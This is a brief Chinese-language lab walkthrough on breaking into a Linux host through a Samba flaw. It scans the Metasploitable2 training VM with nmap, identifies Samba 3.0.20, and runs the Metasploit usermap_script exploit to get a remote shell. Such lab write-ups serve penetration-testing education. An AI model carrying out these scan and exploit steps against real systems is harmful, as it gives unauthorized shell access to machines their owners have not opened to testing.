## 利用samba服务漏洞入侵linux主机

Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成,samba服务对应的端口有139、445.

0、使用`nmap -v -A`扫描
[root@kali: ~#] nmap -v -A metasploitable2 
139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)

Host script results:
| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   METASPLOITABLE<00>   Flags: <unique><active>
|   METASPLOITABLE<03>   Flags: <unique><active>
|   METASPLOITABLE<20>   Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP
|_  System time: 2015-04-01T14:55:13-04:00

[root@kali: ~#] smbclient //metasploitable2/tmp
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]

1、网上搜索samba，得到利用metasploit的exploit
exploit/multi/samba/usermap_script

2、进入msfconsole
```bash 
msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > set RHOST metasploitable2
msf exploit(usermap_script) > exploit
#直接进入shell了

```